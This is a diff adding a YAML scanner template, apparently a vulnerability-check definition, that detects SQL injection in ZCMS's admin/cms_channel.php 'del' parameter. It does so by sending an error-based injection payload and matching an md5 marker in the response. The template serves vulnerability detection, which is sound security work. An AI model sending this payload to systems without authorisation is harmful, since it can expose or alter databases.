@@ -1,0 +1,24 @@
+id: zcms-v3-sqli
+brief:
+    title: ZCMS - SQL Injection
+    by: princechaddha
+    level: critical
+    about: ZCMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of...
+    label:
+        - zcms
+        - sqli
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'''
+      signs:
+        - "on": word
+          has:
+            - '{{md5({{num}})}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
